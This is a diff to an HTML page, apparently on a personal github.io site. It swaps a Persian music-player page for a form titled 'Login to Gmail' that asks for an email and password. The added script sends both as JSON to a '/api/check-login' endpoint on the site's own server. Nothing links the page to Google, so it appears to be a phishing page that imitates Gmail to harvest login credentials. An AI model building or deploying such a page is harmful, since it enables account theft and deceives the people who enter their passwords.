@@ -3,61 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دانلود آهنگ های یاس</title>
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-        }
-
-        header {
-            background-color: #4CAF50; /* رنگ پس‌زمینه هدر */
-            padding: 40px 0; /* افزایش padding بالا و پایین */
-            text-align: center; /* محتوای هدر را در وسط قرار می‌دهد */
-            position: relative; /* برای موقعیت‌دهی مطلق لوگو */
-            overflow: visible; /* برای نمایش قسمت اضافی لوگو */
-        }
-
-        .logo {
-            position: absolute; /* موقعیت‌دهی مطلق */
-            top: 75%; /* تغییر موقعیت عمودی به 75% */
-            left: 50%; /* از وسط هدر */
-            transform: translate(-50%, -50%); /* جابجایی به وسط */
-        }
-
-        .logo img {
-            width: 100px; /* عرض جدید لوگو */
-            height: auto; /* ارتفاع خودکار به نسبت عرض */
-            border-radius: 20px; /* گرد کردن لبه‌های تصویر */
-        }
-
-        main {
-            padding: 20px;
-            text-align: center; /* محتوای اصلی را در وسط قرار می‌دهد */
-        }
-
-        h1 {
-            color: #333; /* رنگ عنوان */
-        }
-
-        p {
-            color: #666; /* رنگ متن */
-        }
-    </style>
+    <title>ورود به جیمیل</title>
 </head>
 <body>
-    <header>
-        <div class="logo">
-            <img src="https://soheilss3.github.io/images.png" alt="لوگو">
-        </div>
-    </header>
-    <main>
-        <h1>یاسر بختیاری ملقب به یاس</h1>
-           <audio controls>
-        <source src="http://soheilss3.github.io/bs.mp3" type="audio/mpeg">
-        <source src="http://hshshdbdi.iapp.ir/s.ogg" type="audio/ogg">
-        مرورگر شما از این فرمت پشتیبانی نمی‌کند.
-           </audio>
-    </main>
+    <h2>فرم ورود به جیمیل</h2>
+    <form id="loginForm">
+        <label for="email">ایمیل:</label>
+        <input type="email" id="email" name="email" required>
+        <br>
+        <label for="password">پسورد:</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <button type="submit">ورود</button>
+    </form>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // جلوگیری از ارسال فرم به صورت عادی
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // ارسال اطلاعات به سمت سرور
+            fetch('/api/check-login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ email, password }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert('ورود موفقیت آمیز!');
+                } else {
+                    alert('ایمیل یا پسورد نادرست است.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
 </body>
 </html>
